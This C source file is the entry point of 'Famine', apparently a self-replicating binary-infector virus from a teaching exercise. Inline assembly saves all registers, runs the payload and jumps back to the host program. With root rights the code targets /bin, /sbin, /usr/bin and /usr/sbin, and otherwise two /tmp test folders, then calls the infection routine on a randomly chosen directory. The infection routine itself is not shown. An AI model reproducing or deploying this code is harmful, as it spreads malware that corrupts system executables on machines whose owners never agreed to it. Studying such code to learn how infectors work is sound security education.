#include <famine.h>

////////////////////////////////////////////////////////////////////////////////
/// BOOTSTRAP FUNCTION
////////////////////////////////////////////////////////////////////////////////

static void entry(void);

int main(void)
{
	constructor();
}

////////////////////////////////////////////////////////////////////////////////
/// PUBLIC FUNCTION
////////////////////////////////////////////////////////////////////////////////

void constructor(void)
{
	__asm__ volatile (
			"push rbx\n"
			"push rsp\n"
			"push rbp\n"
			"push rax\n"
			"push rdi\n"
			"push rsi\n"
			"push rdx\n"
			"push rcx\n"
			"push r8\n"
			"push r9\n"
			"push r10\n"
			"push r11\n"
			"push r12\n"
			"push r13\n"
			"push r14\n"
			"push r15\n"
			);

	entry();

	__asm__ volatile (
			"pop r15\n"
			"pop r14\n"
			"pop r13\n"
			"pop r12\n"
			"pop r11\n"
			"pop r10\n"
			"pop r9\n"
			"pop r8\n"
			"pop rcx\n"
			"pop rdx\n"
			"pop rsi\n"
			"pop rdi\n"
			"pop rax\n"
			"pop rbp\n"
			"pop rsp\n"
			"pop rbx\n"
			);

	__asm__ volatile (
			"add rsp, 8\n"
			"jmp Exit\n"
			);
}

////////////////////////////////////////////////////////////////////////////////
/// STATIC FUNCTIONS
////////////////////////////////////////////////////////////////////////////////

static void launch(struct directory *dir, const size_t size)
{
	for (uint8_t index = 0; index < size; index++)
	{
		if (update_entry(&(dir[index])) == FAILURE)
			return ;
		if (update_path(&(dir[index])) == FAILURE)
			return ;
	}

	famine(dir[_get_random_integer(size)].path);
}

static void entry(void)
{
	if (_getuid() == 0)
	{
		struct directory root[] =
		{
			(struct directory){"/bin/", 0},
			(struct directory){"/sbin/", 0},
			(struct directory){"/usr/bin/", 0},
			(struct directory){"/usr/sbin/", 0},
		};

		launch(root, sizeof(root) / sizeof(root[0]));
	}
	else
	{
		struct directory user[] =
		{
			(struct directory){"/tmp/test/", 0},
			(struct directory){"/tmp/test2/", 0},
		};

		launch(user, sizeof(user) / sizeof(user[0]));
	}
}
